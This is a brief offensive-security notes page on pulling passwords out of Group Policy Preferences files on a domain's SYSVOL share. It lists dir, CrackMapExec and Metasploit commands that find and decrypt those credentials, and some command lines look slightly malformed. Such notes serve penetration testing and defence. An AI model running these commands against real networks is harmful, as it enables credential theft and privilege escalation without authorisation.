# Group Policy Preferences

### Description

Unsecured credentials in Group Policy Preferences (GPP) can be an easy way to obtain credentials and escalate privileges. GPP's are stored in SYSVOL on domain controllers. However, the real kicker is that any domain user can view the SYSVOL share, obtain the password, and decrypt it within seconds.

### Tactics

#### Enumerating Credentials Directly on the SYSVOL Share

`dir /s * .xml`

#### Enumerating Credentials Remotely from SYSVOL

`dir /s \\[FQN]\SYSVOL\[FQDN\ | more`

#### Enumerating Credentials using CrackMapExec

`crackmapexec smb [IP] -u [USERNAME] -p [PASSWORD] -M gpp_password`

#### Enumerating Credentials using Metasploit

1. `use auxiliary/scanner/smb/smb_enum_gpp`
2. `set rhosts [IP_Addresses]`
3. `set SMBUser [USERNAME]`
4. `set SMBPass [PASSWORD]`
